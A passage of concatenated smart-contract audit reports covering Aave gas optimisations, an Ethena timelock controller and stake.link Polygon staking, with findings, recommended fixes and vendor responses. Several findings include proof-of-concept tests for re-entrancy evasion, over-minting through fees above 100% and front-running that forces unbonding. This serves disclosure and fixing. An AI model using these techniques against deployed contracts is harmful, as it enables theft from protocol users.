-  "flashLoan: flash loan for one asset and borrow": "277830",
+  "flashLoan: flash loan for one asset and borrow": "277766",

-  "flashLoan: flash loan for two assets and borrow": "481547",
+  "flashLoan: flash loan for two assets and borrow": "481419",

-  "liquidationCall: deficit on liquidated asset": "389335",
-  "liquidationCall: deficit on liquidated asset + other asset": "487617",
-  "liquidationCall: full liquidation": "389335",
-  "liquidationCall: full liquidation and receive ATokens": "365723",
-  "liquidationCall: partial liquidation": "380761",
-  "liquidationCall: partial liquidation and receive ATokens": "357148",
-  "repay: full repay": "176156",
-  "repay: full repay with ATokens": "173565",
-  "repay: partial repay": "189587",
-  "repay: partial repay with ATokens": "184775",
-  "supply: collateralDisabled": "146423",
-  "supply: collateralEnabled": "146423",
+  "liquidationCall: deficit on liquidated asset": "389079",
+  "liquidationCall: deficit on liquidated asset + other asset": "487297",
+  "liquidationCall: full liquidation": "389079",
+  "liquidationCall: full liquidation and receive ATokens": "365403",
+  "liquidationCall: partial liquidation": "380505",
+  "liquidationCall: partial liquidation and receive ATokens": "356828",
+  "repay: full repay": "176092",
+  "repay: full repay with ATokens": "173437",
+  "repay: partial repay": "189523",
+  "repay: partial repay with ATokens": "184647",
+  "supply: collateralDisabled": "146359",
+  "supply: collateralEnabled": "146359",
```

`snapshots/RewardsController.json`: (claiming worse)
```diff
-   "claimAllRewards: one reward type": "50131",
-   "claimAllRewardsToSelf: one reward type": "49927",
-   "claimRewards partial: one reward type": "48250",
-   "claimRewards: one reward type": "47988",
+  "claimAllRewards: one reward type": "50311",
+  "claimAllRewardsToSelf: one reward type": "50107",
+  "claimRewards partial: one reward type": "48430",
+  "claimRewards: one reward type": "48168"
```

`snapshots/StataTokenV2.json`: (some worse, some better)
```diff
-  "claimRewards": "359522",
-  "deposit": "280209",
-  "depositATokens": "219279",
-  "redeem": "205420",
-  "redeemAToken": "152498"
+  "claimRewards": "359882",
+  "deposit": "280145",
+  "depositATokens": "219151",
+  "redeem": "205356",
+  "redeemAToken": "152370"
```

`snapshots/WrappedTokenGatewayV3.json`:
```diff
-  "borrowETH": "249186",
-  "depositETH": "222292",
-  "repayETH": "192572",
-  "withdrawETH": "258766"
+  "borrowETH": "249122",
+  "depositETH": "222228",
+  "repayETH": "192508",
+  "withdrawETH": "258574"
```

**Recommended Mitigation:** See commit [be7f13c](https://github.com/devdacian/aave-v3-origin-liquidation-gas-fixes/commit/be7f13c5ddef7343f4a3911a6e573cfcd29ed271).


### Read and increment `streamId` in same statement, also use named return in `Collector::createStream`

**Description:** Read and increment `streamId` in same statement, also use named return in `Collector::createStream`.

**Impact:** `snapshots/Collector.json`:
```diff
-  "createStream": "211680",
+  "createStream": "211600",
```

**Recommended Mitigation:** See commit [a008981](https://github.com/devdacian/aave-v3-origin-liquidation-gas-fixes/commit/a008981433710d3603be8d44dacbb3d1d62e18b8).



### Don't copy entire `Stream` struct from `storage` to `memory` in `Collector::deltaOf`

**Description:** Don't copy entire `Stream` struct from `storage` to `memory` in `Collector::deltaOf`, since only 2 variables are required.

**Impact:** `snapshots/Collector.json`:
```diff
-  "cancelStream: by funds admin": "18522",
-  "cancelStream: by recipient": "49489",
+  "cancelStream: by funds admin": "16710",
+  "cancelStream: by recipient": "47635",
-  "withdrawFromStream: final withdraw": "43594",
-  "withdrawFromStream: intermediate withdraw": "42252"
+  "withdrawFromStream: final withdraw": "42656",
+  "withdrawFromStream: intermediate withdraw": "41326"
```

**Recommended Mitigation:** See commit [78c8150](https://github.com/devdacian/aave-v3-origin-liquidation-gas-fixes/commit/78c81502825580181528787596cde4521c05194e).




### Remove struct `BalanceOfLocalVars` and use local variables in `Collector::balanceOf`

**Description:** Remove struct `BalanceOfLocalVars` and use local variables in `Collector::balanceOf`.

**Impact:** `snapshots/Collector.json`:
```diff
-  "cancelStream: by funds admin": "16710",
-  "cancelStream: by recipient": "47635",
+  "cancelStream: by funds admin": "16483",
+  "cancelStream: by recipient": "47407",
-  "withdrawFromStream: final withdraw": "42656",
-  "withdrawFromStream: intermediate withdraw": "41326"
+  "withdrawFromStream: final withdraw": "42560",
+  "withdrawFromStream: intermediate withdraw": "41230"
```

**Recommended Mitigation:** See commit [cc31124](https://github.com/devdacian/aave-v3-origin-liquidation-gas-fixes/commit/cc31124fd1f30081c053f9a1b1294afad2b9958f).




### Remove struct `CreateStreamLocalVars` and use local variables in `Collector::createStream`

**Description:** Remove struct `CreateStreamLocalVars` and use local variables in `Collector::createStream`.

**Impact:** `snapshots/Collector.json`:
```diff
-  "createStream": "211600",
+  "createStream": "211518",
```

**Recommended Mitigation:** See commit [dc3da97](https://github.com/devdacian/aave-v3-origin-liquidation-gas-fixes/commit/dc3da97e44f523045642364d301c08f578450361).




### Don't copy entire `Stream` struct from `storage` to `memory` and refactor `onlyAdminOrRecipient` modifier into internal function in `Collector::withdrawFromStream` and `cancelStream`

**Description:** Don't copy entire `Stream` struct from `storage` to `memory` and refactor `onlyAdminOrRecipient` modifier into internal function in `Collector::withdrawFromStream` and `cancelStream`.

**Impact:** `snapshots/Collector.json`:
```diff
-  "cancelStream: by funds admin": "16483",
-  "cancelStream: by recipient": "47407",
+  "cancelStream: by funds admin": "15718",
+  "cancelStream: by recipient": "46456",
-  "withdrawFromStream: final withdraw": "42560",
-  "withdrawFromStream: intermediate withdraw": "41230"
+  "withdrawFromStream: final withdraw": "41449",
+  "withdrawFromStream: intermediate withdraw": "40224"
```

**Recommended Mitigation:** See commit [73e6123](https://github.com/devdacian/aave-v3-origin-liquidation-gas-fixes/commit/73e61234427c673fd1852f88862b3f154d2c74ce).




### Cache `oldId` prior to `require` check to save 1 storage read in `PoolAddressesProviderRegistry::unregisterAddressesProvider`

**Description:** Cache `oldId` prior to `require` check to save 1 storage read in `PoolAddressesProviderRegistry::unregisterAddressesProvider`:

**Recommended Mitigation:**
```diff
  function unregisterAddressesProvider(address provider) external override onlyOwner {
-   require(_addressesProviderToId[provider] != 0, Errors.ADDRESSES_PROVIDER_NOT_REGISTERED);
    uint256 oldId = _addressesProviderToId[provider];
+   require(oldId != 0, Errors.ADDRESSES_PROVIDER_NOT_REGISTERED);
    _idToAddressesProvider[oldId] = address(0);
    _addressesProviderToId[provider] = 0;
```

See commit [93935b8](https://github.com/devdacian/aave-v3-origin-liquidation-gas-fixes/commit/93935b820e52ea8ee8498eae928b2c2d9b695124).

\clearpage

------ FILE END car/reports_md/2025-05-08-cyfrin-gas-aave3.3-v1.0.md ------


------ FILE START car/reports_md/2025-05-16-cyfrin-ethena-timelock-v2.0.md ------

**Lead Auditors**

[Dacian](https://x.com/DevDacian)

[Hans](https://x.com/hansfriese)
**Assisting Auditors**

[Alex Roan](https://twitter.com/alexroan)

[Giovanni Di Siena](https://twitter.com/giovannidisiena)

---

# Findings
## Low Risk


### Only allow execution if value parameters match `msg.value` to prevent eth remaining in the `EthenaTimelockController` contract

**Description:** `EthenaTimelockController::execute` and `executeWhitelistedBatch` allow execution without checking that the `msg.value` is equal to the input `value`/`values` parameters.

This can result in eth being temporarily stuck in the contract, though it can be "rescued" by doing a follow-up execution with zero `msg.value` but non-zero `value` input.

**Recommended Mitigation:** Enforce an invariant that the `EthenaTimelockController` should never finish a transaction with a positive ETH balance by:
* in `execute` revert if `msg.value != value`
* in `executeWhitelistedBatch` revert if `msg.value != sum(values)`

The idea being that every execution should use all of the input `msg.value` and no eth from any execution should remain in the `EthenaTimelockController` contract.

**Ethena:** Fixed in commit [89d4190](https://github.com/ethena-labs/timelock-contract/commit/89d41901be3387c11c2150c19eb99883ed807d79) by enforcing this invariant in `execute`, `executeBatch` and `executeWhitelistedBatch`.

**Cyfrin:** Verified.


### Re-entrancy protection can be evaded via `TimelockController::executeBatch`

**Description:** `EthenaTimelockController::execute` overrides `TimelockController::execute` and adds a `nonReentrant` modifier to prevent re-entrant calls back into it.

However `TimelockController::executeBatch` is not overridden so re-entrancy can still occur that way. Beyond the re-entrancy evasion this doesn't appear further exploitable.

**Proof Of Concept:**
In `test/EthenaTimelockController.t.sol`, change `MaliciousReentrant::maliciousExecute` to:
```solidity
function maliciousExecute() external {
    if (!reentered) {
        reentered = true;
        // re-enter the timelock through executeBatch
        bytes memory data = abi.encodeWithSignature("maliciousFunction()");
        address[] memory targets = new address[](1);
        targets[0] = address(this);
        uint256[] memory values = new uint256[](1);
        values[0] = 0;
        bytes[] memory payloads = new bytes[](1);
        payloads[0] = data;
        timelock.executeBatch(targets, values, payloads, bytes32(0), bytes32(0));
    }
}
```

Then run the relevant test: `forge test --match-test testExecuteWhitelistedReentrancy -vvv` and see that the test fails because the expected re-entrancy error no longer gets thrown.

**Recommended Mitigation:** Override `TimelockController::executeBatch` in `EthenaTimelockController` to add `nonReentrant` modifier then call the parent function.

**Ethena:** Fixed in commit [89d4190](https://github.com/ethena-labs/timelock-contract/commit/89d41901be3387c11c2150c19eb99883ed807d79#diff-8ca72e61ebf9a693737b5c9052aa3814e8b291e3d6dd0341fe88b5b5e781427bR147).

**Cyfrin:** Verified.


### `TimelockController` won't revert when executing on non-existent contracts

**Description:** `TimelockController::_execute` does this:
```solidity
function _execute(address target, uint256 value, bytes calldata data) internal virtual {
    (bool success, bytes memory returndata) = target.call{value: value}(data);
    Address.verifyCallResult(success, returndata);
}
```

If `target` is a non-existent contract but `data` contains a valid expected function call with parameters, the `call` will return `true`; `Address.verifyCallResult` fails to catch this case.

**Proof Of Concept:**
Add PoC function to `test/EthenaTimelockController.sol`:
```solidity
function testExecuteNonExistentContract() public {
    bytes memory data = abi.encodeWithSignature("DONTEXIST()");
        _scheduleWaitExecute(address(0x1234), data);
}
```

Run with: `forge test --match-test testExecuteNonExistentContract -vvv`

**Recommended Mitigation:** We reported this bug to OpenZeppelin but they said they prefer the current implementation as it is more flexible. We disagree with this assessment and believe it is incorrect for `TimelockController::_execute` to not revert when there is valid calldata but the target has no code.

**Ethena:** Fixed in commit [e58c547](https://github.com/ethena-labs/timelock-contract/commit/e58c547e3bcbea79d9df7121b5bb04626a2b72e0#diff-8ca72e61ebf9a693737b5c9052aa3814e8b291e3d6dd0341fe88b5b5e781427bR191-R197) by overriding `_execute` to revert if `data.length > 0 && target.code.length == 0`.

**Cyfrin:** Verified.


### `EthenaTimelockController::addToWhitelist` and `removeFromWhitelist` don't revert for non-existent `target` address

**Description:** `EthenaTimelockController::addToWhitelist` and `removeFromWhitelist` should revert if the `target` address doesn't exist (has no code).

**Proof of Concept:** Add PoC function to `test/EthenaTimelockController.t.sol`:
```solidity
function testAddNonExistentContractToWhitelist() public {
    bytes memory addToWhitelistData = abi.encodeWithSignature(
        "addToWhitelist(address,bytes4)", address(0x1234), bytes4(keccak256("DONTEXIST()"))
    );
    _scheduleWaitExecute(address(timelock), addToWhitelistData);
}
```

Run with: `forge test --match-test testAddNonExistentContractToWhitelist -vvv`

**Recommended Mitigation:** Revert if `target.code.length == 0`.

**Ethena:** Fixed in commit [89d4190](https://github.com/ethena-labs/timelock-contract/commit/89d41901be3387c11c2150c19eb99883ed807d79#diff-8ca72e61ebf9a693737b5c9052aa3814e8b291e3d6dd0341fe88b5b5e781427bR6-R76) to not allow whitelisting of targets with no code.

**Cyfrin:** Verified.

\clearpage
## Informational


### Use named imports

**Description:** Use named imports:
```diff
- import "@openzeppelin/contracts/governance/TimelockController.sol";
- import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
+ import {TimelockController, Address} from "@openzeppelin/contracts/governance/TimelockController.sol";
+ import {ReentrancyGuard} from "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
```

**Ethena:** Fixed in commit [89d4190](https://github.com/ethena-labs/timelock-contract/commit/89d41901be3387c11c2150c19eb99883ed807d79#diff-8ca72e61ebf9a693737b5c9052aa3814e8b291e3d6dd0341fe88b5b5e781427bL4-R5).

**Cyfrin:** Verified.


### Use named mappings

**Description:** Use named mappings to explicitly indicate the purpose of keys and values:
```diff
-    mapping(address => mapping(bytes4 => bool)) private _functionWhitelist;
+    mapping(address target => mapping(bytes4 selector => bool allowed)) private _functionWhitelist;
```

**Ethena:** Fixed in commit [89d4190](https://github.com/ethena-labs/timelock-contract/commit/89d41901be3387c11c2150c19eb99883ed807d79#diff-8ca72e61ebf9a693737b5c9052aa3814e8b291e3d6dd0341fe88b5b5e781427bL28-R29).

**Cyfrin:** Verified.


### Don't allow initially granting `EXECUTOR_ROLE` or `WHITELISTED_EXECUTOR_ROLE` to `address(0)`

**Description:** The client has stated that initially they want the `EXECUTOR_ROLE` to be closed and that in the future they may open this up.

Hence `EthenaTimelockController::constructor` should revert if any elements in the `executors` or `whitelistedExecutors` input arrays is `address(0)`.

**Ethena:** Acknowledged; we prefer to keep the optionality here.


### Only emit events if state actually changes

**Description:** A number of functions in `EthenaTimelockController` will emit events even if the state did not change since they simply write to storage but don't read the current storage value to check if it is changing.

Ideally these functions would revert or at least not emit events if the state did not change:
* `addToWhitelist`
* `removeFromWhitelist`

**Ethena:** Acknowledged.

\clearpage
## Gas Optimization


### Use `ReentrancyGuardTransient` for more efficient `nonReentrant` modifiers

**Description:** Use [`ReentrancyGuardTransient`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/ReentrancyGuardTransient.sol) for more efficient `nonReentrant` modifiers:
```diff
- import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
+ import {ReentrancyGuardTransient} from "@openzeppelin/contracts/utils/ReentrancyGuardTransient.sol";

- contract EthenaTimelockController is TimelockController, ReentrancyGuard {
+ contract EthenaTimelockController is TimelockController, ReentrancyGuardTransient {
```

**Ethena:** Fixed in commit [89d4190](https://github.com/ethena-labs/timelock-contract/commit/89d41901be3387c11c2150c19eb99883ed807d79#diff-8ca72e61ebf9a693737b5c9052aa3814e8b291e3d6dd0341fe88b5b5e781427bR5-R19).

**Cyfrin:** Verified.

\clearpage

------ FILE END car/reports_md/2025-05-16-cyfrin-ethena-timelock-v2.0.md ------


------ FILE START car/reports_md/2025-05-19-cyfrin-stakedotlink-polygon-staking-v2.0.md ------

**Lead Auditors**

[0kage](https://x.com/0kage_eth)

[holydevoti0n](https://github.com/h0lydev)


**Assisting Auditors**



---

# Findings
## Medium Risk


### Unfair distribution of unbonding due to improper validator withdrawal index advancement

**Description:** `PolygonStrategy::unbond` tracks the `validatorWithdrawalIndex` to evenly distribute unbonding requests across vaults. The index is advanced based on the loop progression rather than actual unbonding actions, which can lead to uneven distribution of unbonding across validators.

Currently, when processing vaults during unbonding:

 - The function starts at the validatorWithdrawalIndex and iterates through vaults
- If a vault has sufficient rewards to cover the unbonding amount, only rewards are withdrawn with no actual unbonding of principal
- The validatorWithdrawalIndex is still updated to the next vault in sequence, even if no principal was unbonded
- If the index reaches the end of the vaults array, it wraps around to 0

This logic causes validators with high rewards to effectively "shield" their principal deposits from being unbonded, unfairly pushing the unbonding burden to other validators that might have already unbonded.

Specifically, in the unbond function:

```solidity
while (toUnbondRemaining != 0) {
    // Process vault[i]...
    ++i;
    if (i >= vaults.length) i = 0;
}
validatorWithdrawalIndex = i; // @audit This happens regardless of whether unbonding occurred on the last processed vault or not
```
Even if the rewards were sufficient to honor `unbond` request, `vaultWithdrawalIndex` still advances.


**Impact:** This issue creates a potential fairness problem in the distribution of unbonding actions across validators. Validators that generate more rewards are less likely to have their principal deposits unbonded, while validators with fewer rewards will bear a disproportionate share of the unbonding burden.

Effectively, some vaults get repeatedly unbonded while others skip their turn.


**Proof of Concept:** In the `unbond should work correctly` test, at line 304 in `polygon-strategy.test.ts`, note that the `validatorWithdrawalIndex` resets to 0 even though the there was no unbonding on vault[2]. vault[0] gets unbonded twice while vault[2] skips unbonding altogether in the current round.


**Recommended Mitigation:** Consider modifying the `unbond` function to only advance the `validatorWithdrawalIndex` when actual unbonding of principal deposits occurs, not just when rewards are withdrawn:

```diff solidity
function unbond(uint256 _toUnbond) external onlyFundFlowController {
    if (numVaultsUnbonding != 0) revert UnbondingInProgress();
    if (_toUnbond == 0) revert InvalidAmount();

    uint256 toUnbondRemaining = _toUnbond;
    uint256 i = validatorWithdrawalIndex;
    uint256 skipIndex = validatorRemoval.isActive
        ? validatorRemoval.validatorId
        : type(uint256).max;
    uint256 numVaultsUnbonded;
    uint256 preBalance = token.balanceOf(address(this));
++ uint256 nextIndex = i; // Track the next index separately

    while (toUnbondRemaining != 0) {
        if (i != skipIndex) {
            IPolygonVault vault = vaults[i];
            uint256 deposits = vault.getTotalDeposits();

            if (deposits != 0) {
                uint256 principalDeposits = vault.getPrincipalDeposits();
                uint256 rewards = deposits - principalDeposits;

                if (rewards >= toUnbondRemaining) {
                    vault.withdrawRewards();
                    toUnbondRemaining = 0;
                } else {
                    toUnbondRemaining -= rewards;
                    uint256 vaultToUnbond = principalDeposits >= toUnbondRemaining
                        ? toUnbondRemaining
                        : principalDeposits;

                    vault.unbond(vaultToUnbond);
++               nextIndex = (i + 1) % vaults.length; // Update next index only when unbonding principal
                    toUnbondRemaining -= vaultToUnbond;
                    ++numVaultsUnbonded;
                }
            }
        }

        ++i;
        if (i >= vaults.length) i = 0;
    }
--    validatorWithdrawalIndex = i;
++    // Only update the index if we actually unbonded principal from at least one vault
++    if (numVaultsUnbonded > 0) {
++       validatorWithdrawalIndex = nextIndex;
++   }

    numVaultsUnbonding = numVaultsUnbonded;

    uint256 rewardsClaimed = token.balanceOf(address(this)) - preBalance;
    if (rewardsClaimed != 0) totalQueued += rewardsClaimed;

    emit Unbond(_toUnbond);
}

```

**Stake.link:**
Resolved in [PR 151](https://github.com/stakedotlink/contracts/pull/151/commits/9fd654b46a0b9008a134fe67145d446f7e04d8ce).

**Cyfrin:** Resolved.


### Validator and protocol fees can exceed 100 percent of rewards in `PolygonStrategy.sol`

**Description:** The `setValidatorMEVRewardsPercentage` function in `PolygonStrategy.sol` allows setting the validator MEV rewards percentage up to 100% (10,000 basis points), but does not account for the total protocol fees (`_totalFeesBasisPoints`). This means the combined sum of all fees can exceed 100% of the rewards, leading to over-distribution of rewards. While `setValidatorMEVRewardsPercentage` only checks its own limit:
```solidity
function setValidatorMEVRewardsPercentage(
    uint256 _validatorMEVRewardsPercentage
) external onlyOwner {
    // @audit should consider the totalFeesBasisPoints.
    // updateDeposits will report more than it can pay in fees.
    if (_validatorMEVRewardsPercentage > 10000) revert FeesTooLarge();

    validatorMEVRewardsPercentage = _validatorMEVRewardsPercentage;
    emit SetValidatorMEVRewardsPercentage(_validatorMEVRewardsPercentage);
}
```
Notice the other fees has a limit of 30% in basis points:
```solidity
// updateFee
if (_totalFeesBasisPoints() > 3000) revert FeesTooLarge();
```
This separation allows the sum of `validatorMEVRewardsPercentage` and protocol fees to exceed 100% of the rewards, which can lead to an over-minting scenario in `StakingPool.sol`:
```solidity
function updateDeposits(
        bytes calldata
    )
        external
        onlyStakingPool
        returns (int256 depositChange, address[] memory receivers, uint256[] memory amounts)
    {
    ...
@>            uint256 validatorMEVRewards = ((balance - totalQueued) *
                validatorMEVRewardsPercentage) / 10000;

            receivers = new address[](fees.length + (validatorMEVRewards != 0 ? 1 : 0));
            amounts = new uint256[](receivers.length);

            for (uint256 i = 0; i < fees.length; ++i) {
                receivers[i] = fees[i].receiver;
@>                amounts[i] = (uint256(depositChange) * fees[i].basisPoints) / 10000;
            }

            if (validatorMEVRewards != 0) {
@>                receivers[receivers.length - 1] = address(validatorMEVRewardsPool);
@>                amounts[amounts.length - 1] = validatorMEVRewards;
            }
           ...
}

// StakingPool._updateStrategyRewards
uint256 sharesToMint = (totalFeeAmounts * totalShares) /
    (totalStaked - totalFeeAmounts);
_mintShares(address(this), sharesToMint);
```

**Example**
1. The owner sets `validatorMEVRewardsPercentage` to 100% (10,000 basis points).
2. The protocol fee is 20% (2,000 basis points) via `_totalFeesBasisPoints`.
3. The contract now has a combined fee rate of 120% (10,000 + 2,000 basis points).
4. When 10 tokens are available as rewards, the `updateDeposits` reports to `StakingPool` logic 12 tokens to be minted.
5. This results in the system issuing more tokens than it actually has, leading to over-minting of shares in the pool.

**Impact:** protocol fees can exceed 100% of rewards

**Proof of Concept:** In `polygon-strategy.test.ts` modify the strategy initialization to include 20% of fees:
```diff
const strategy = (await deployUpgradeable('PolygonStrategy', [
      token.target,
      stakingPool.target,
      stakeManager.target,
      vaultImp,
      2500,
-    []
+      [
+        {
+          receiver: ethers.Wallet.createRandom().address,
+          basisPoints: 1000 // 10%
+        },
+        {
+          receiver: ethers.Wallet.createRandom().address,
+          basisPoints: 1000 // 10%
+        }
+      ],
    ])) as PolygonStrategy
```
Then add the following test and run `npx hardhat test test/polygonStaking/polygon-strategy.test.ts`:
```javascript
 describe.only('updateDeposits mint above 100%', () => {
    it('should cause stakingPool to overmint rewards', async () => {
      const { strategy, token, vaults, accounts, stakingPool, validatorShare, validatorShare2 } =
        await loadFixture(deployFixture)

    await strategy.setValidatorMEVRewardsPercentage(10000) // 100%
    // current fees is 20% for receivers + 100% for validator rewards

    await stakingPool.deposit(accounts[1], toEther(1000), ['0x'])
    await strategy.depositQueuedTokens([0, 1, 2], [toEther(10), toEther(20), toEther(30)])

    assert.equal(fromEther(await strategy.getTotalDeposits()), 1000)
    assert.equal(fromEther(await strategy.totalQueued()), 940)
    assert.equal(fromEther(await strategy.getDepositChange()), 0)

    // send 10 MATIC to strategy
    await token.transfer(strategy.target, toEther(10))
    assert.equal(fromEther(await strategy.getDepositChange()), 10)

  // @audit we will mint 120% of 10 instead of 100%
  // notice totalRewards is 10(depositChange),
  await expect(stakingPool.updateStrategyRewards([0], '0x'))
  .to.emit(stakingPool, "UpdateStrategyRewards")
  // totalRewards = strategy.depositChange
  //       msg.sender,  totalStaked,   totalRewards, totalFeeAmounts
  .withArgs(accounts[0], toEther(1010), toEther(10), toEther(12));
    })
  });
```
Output:
```javascript
PolygonStrategy
    updateDeposits mint above 100%
       should cause stakingPool to overmint rewards (608ms)

  1 passing (611ms)
```


**Recommended Mitigation:** When updating fees check if total fees(mevRewards + fees) do not surpass 100%:
```diff
    function setValidatorMEVRewardsPercentage(
        uint256 _validatorMEVRewardsPercentage
    ) external onlyOwner {
-         if (_validatorMEVRewardsPercentage > 10000) revert FeesTooLarge();
+        if (_validatorMEVRewardsPercentage + _totalFeesBasisPoints() > 10000) revert FeesTooLarge();

        validatorMEVRewardsPercentage = _validatorMEVRewardsPercentage;
        emit SetValidatorMEVRewardsPercentage(_validatorMEVRewardsPercentage);
    }
    function addFee(address _receiver, uint256 _feeBasisPoints) external onlyOwner {
        _updateStrategyRewards();
        fees.push(Fee(_receiver, _feeBasisPoints));
-        if (_totalFeesBasisPoints() > 3000) revert FeesTooLarge();
+       uint256 totalFees = _totalFeesBasisPoints();
+       if (totalFees > 3000 || totalFees + validatorMEVRewardsPercentage > 10000) revert FeesTooLarge();
        emit AddFee(_receiver, _feeBasisPoints);
    }

       function updateFee(
        uint256 _index,
        address _receiver,
        uint256 _feeBasisPoints
    ) external onlyOwner {
        _updateStrategyRewards();

        if (_feeBasisPoints == 0) {
            fees[_index] = fees[fees.length - 1];
            fees.pop();
        } else {
            fees[_index].receiver = _receiver;
            fees[_index].basisPoints = _feeBasisPoints;
        }

-        if (_totalFeesBasisPoints() > 3000) revert FeesTooLarge();
+       uint256 totalFees = _totalFeesBasisPoints();
+       if (totalFees > 3000 || totalFees + validatorMEVRewardsPercentage > 10000) revert FeesTooLarge();
        emit UpdateFee(_index, _receiver, _feeBasisPoints);
    }
```


**Stake.link:**
Resolved in [PR 151](https://github.com/stakedotlink/contracts/pull/151/commits/3c5d2526185e4911eca5826ac136f3d21d32eab2)

**Cyfrin:** Resolved.

\clearpage
## Low Risk


### `PolygonStrategy::upgradeVaults` does not verify if vaults to upgrade are the same as the ones stored in strategy

**Description:** `PolygonStrategy::upgradeVaults` takes an input of `_vaults` array and upgrades them to the latest `vaultImplementation` as follows:

```solidity
 function upgradeVaults(address[] calldata _vaults, bytes[] memory _data) external onlyOwner {

        for (uint256 i = 0; i < _vaults.length; ++i) { //@audit no check if the _vault address is actually one locally stored
            if (_data.length == 0 || _data[i].length == 0) {
                IPolygonVault(_vaults[i]).upgradeTo(vaultImplementation);
            } else {
                IPolygonVault(_vaults[i]).upgradeToAndCall(vaultImplementation, _data[i]);
            }
        }
        emit UpgradedVaults(); //@audit does not emit the list of vaults actually updated
    }
```

Current implementation has several issues:

1. There is no check to verify if the input addresses actually match the ones locally stored in the contract. Owner can send totally different addresses and still can trigger the `UpgradedVaults` event
2. `UpgradedVaults` event does not contain the list of vault addresses actually updated. This prevents off-chain listeners from detecting which vaults were actually upgraded.
3. Passing specific vaults as input can lead to a scenario where a section of vaults are running on the latest implementation while another batch correspond to an older vault implementation. Not only can this create confusion among protocol admins but it can also make the upgrade process risky, specially when a bug is discovered in the vault implementation contract.


**Impact:** Lack of transparency around vault upgrades can lead to human errors associated with contract upgrades.

**Recommended Mitigation:** Consider making following changes:
1. Upgrade all vaults in the strategy at once to new implementation
2. In the event there are too many vaults and 1. is not feasible, then emit the vault indices that are upgraded. In addition, instead of passing the vault addresses as input, pass the vault indices as input to the `upgradeVaults` function.

**Stake.Link:** Resolved in [PR 151](https://github.com/stakedotlink/contracts/pull/151/commits/c62e94ca962f7ba732f1a74396e5319dd5014697)

**Cyfrin:** Resolved.


### Reward restaking creates unnecessary unbonding in edge cases

**Description:** The `PolygonStrategy::restakeRewards()` function is publicly callable by anyone, allowing rewards to be restaked immediately before the `PolygonStrategy::unbond()` function is called.

In specific scenarios, this can cause the protocol to unnecessarily unbond principal funds when rewards would have been sufficient to satisfy withdrawal requests.

The issue stems from how rewards are calculated in the `unbond()` function:

```solidity
// In PolygonStrategy::unbond()
uint256 deposits = vault.getTotalDeposits();
uint256 principalDeposits = vault.getPrincipalDeposits();
uint256 rewards = deposits - principalDeposits; //@audit this would be 0 if restakeRewards is called just before

if (rewards >= toUnbondRemaining) {
    vault.withdrawRewards();
    toUnbondRemaining = 0;
} else {
    toUnbondRemaining -= rewards;
    uint256 vaultToUnbond = principalDeposits >= toUnbondRemaining
        ? toUnbondRemaining
        : principalDeposits;

    vault.unbond(vaultToUnbond);

    toUnbondRemaining -= vaultToUnbond;
    ++numVaultsUnbonded; //@audit this will be 1 more than necessary
}

```

Meanwhile, the `PolygonStrategy::restakeRewards()` function is publicly accessible:

```solidity
// In PolygonStrategy::restakeRewards()
function restakeRewards(uint256[] calldata _vaultIds) external {
    for (uint256 i = 0; i < _vaultIds.length; ++i) {
        vaults[_vaultIds[i]].restakeRewards();
    }

    emit RestakeRewards();
}
```

**Impact:** Consider a specific scenario:

- First eligible vault has sufficient rewards to cover an unbonding request completely
- Just before unbond() is called, Alice calls restakeRewards()
- When unbond() executes, it finds no rewards and must unbond principal instead
- This unnecessarily increments numVaultsUnbonding

In this scenario, queued token deposits will face denial of service

**Proof of Concept:** Add the following:

```javascript
 describe.only('restakeRewards forces protocol to wait for withdrawal delay', async () => {
    it('should force protocol to wait for withdrawal delay', async () => {
      const { token, strategy, vaults, fundFlowController, withdrawalPool, validatorShare } =
        await loadFixture(deployFixture)

      await withdrawalPool.setTotalQueuedWithdrawals(toEther(960))
      assert.equal(await fundFlowController.shouldUnbondVaults(), true);

      // 1. Pre-condition: one validator can cover the amount to unbond with his rewards.
      await validatorShare.addReward(vaults[0].target, toEther(1000));

      // 2. User front-runs the unbondVaults transaction and restakes rewards for validators.
      await strategy.restakeRewards([0]);

      const totalQueuedBefore = await strategy.totalQueued();
      // 3. Protocol is forced to unbond and wait for withdrawal delay even though
      // it could obtain the funds after calling vault.withdrawRewards.
      await fundFlowController.unbondVaults()
      const totalQueuedAfter = await strategy.totalQueued();

      assert.equal(await fundFlowController.shouldUnbondVaults(), false)

      // 4. TotalQueued did not increase, meaning strategy could not withdraw any funds
      // and vault is unbending(it wouldn't be if it cover the funds with the rewards).
      assert.equal(totalQueuedBefore, totalQueuedAfter)
      assert.equal(await vaults[0].isUnbonding(), true)
    })
  })
```

Here is the output:

```javascript
  PolygonFundFlowController
    restakeRewards forces protocol to wait for withdrawal delay
       should force protocol to wait for withdrawal delay (626ms)


  1 passing (628ms)
```

**Recommended Mitigation:** Consider restricting access to `restakeRewards` in both the strategy and vault contracts.


**Stake.Link:** Acknowledged. There should never be a significant amount of unclaimed rewards under normal circumstances as they will be claimed every time there is a deposit/unbond.

**Cyfrin:** Acknowledged.


### DoS in unbonding when validator rewards fall below min amount threshold

**Description:** The [unbond](https://github.com/stakedotlink/contracts/blob/1d3aa1ed6c2fb7920b3dc3d87ece5d1645e1a628/contracts/polygonStaking/PolygonStrategy.sol#L213-L263) function in `PolygonStrategy` is vulnerable to DoS when small reward amounts are used to cover the remaining amount to withdraw.

When [PolygonFundFlowController.unbondVaults](https://github.com/stakedotlink/contracts/blob/1d3aa1ed6c2fb7920b3dc3d87ece5d1645e1a628/contracts/polygonStaking/PolygonFundFlowController.sol#L121) is called it passes the amount to withdraw/unbond to `PolygonStrategy.unbond`:
```solidity
    function unbondVaults() external {
       ...
        uint256 toWithdraw = queuedWithdrawals - (queuedDeposits + validatorRemovalDeposits);
@>        strategy.unbond(toWithdraw);
        timeOfLastUnbond = uint64(block.timestamp);
    }
```

The `unbond` function loops through validators, using their rewards to cover the withdrawal amount. If rewards are insufficient, it unbonds from the validator's principal deposits.
```solidity
function unbond(uint256 _toUnbond) external onlyFundFlowController {
   ...
    if (rewards >= toUnbondRemaining) {
        // @audit withdrawRewards could be below the threshold from ValidatorShares
@>        vault.withdrawRewards();
        toUnbondRemaining = 0;
    } else {
        toUnbondRemaining -= rewards;
        uint256 vaultToUnbond = principalDeposits >= toUnbondRemaining
            ? toUnbondRemaining
            : principalDeposits;
@>        vault.unbond(vaultToUnbond);
        toUnbondRemaining -= vaultToUnbond;
        ++numVaultsUnbonded;
    }
   ...
}
```

